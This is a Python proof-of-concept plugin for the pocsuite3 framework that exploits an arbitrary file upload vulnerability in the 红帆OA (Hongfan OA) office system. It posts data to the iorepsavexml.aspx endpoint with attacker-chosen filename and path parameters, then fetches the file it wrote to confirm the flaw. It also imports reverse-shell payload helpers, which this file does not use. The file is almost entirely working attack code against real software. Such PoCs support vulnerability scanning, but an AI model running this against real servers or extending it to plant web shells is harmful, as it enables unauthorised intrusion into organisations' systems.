# _*_ coding:utf-8 _*_
# @Time : 2023/12/5 20:21
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class iorepsavexml(POCBase):
    pocDesc = '''红帆OA iorepsavexml.aspx文件上传漏洞'''
    vulID = '2023112802'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-05'
    createDate = '2023-12-05'
    updateDate = '2023-12-05'
    name = '红帆OA iorepsavexml.aspx文件上传漏洞'
    appName = '红帆OA'



    def _verify(self):

        result = {}
        url = self.url+ '/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=check.txt&filepath=/upfiles/rep/pic/'
        check_path = self.url+ "/ioffice/upfiles/rep/pic/check.txt"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            "Cookie": "ASP.NET_SessionId=lcluwirkrcqj42iuxfvafoq4",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        path = "/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=check.txt&filepath=/upfiles/rep/pic/"
        try:
            data = "This website has a vulnerability!!!"

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                check_response = requests.get(check_path, headers=headers, verify=False)
                if check_response.status_code == 200 and 'This website has a vulnerability!!!' in check_response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['path'] = path

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(iorepsavexml)